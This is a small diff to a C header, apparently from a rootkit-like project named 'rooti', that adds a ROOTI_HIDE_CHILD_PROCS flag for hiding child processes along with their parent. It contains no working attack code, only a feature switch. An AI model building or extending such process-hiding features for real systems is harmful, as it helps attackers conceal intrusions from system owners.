@@ -59,4 +59,7 @@ extern const struct rooti_net_policy ROOTI_NET_POLICY;
 // This flag should only be set for debugging purposes
 #define ROOTI_DEBUG_LOGGING
 
+// Indicates whether child processes should be hidden along with the parent
+#define ROOTI_HIDE_CHILD_PROCS
+
 #endif
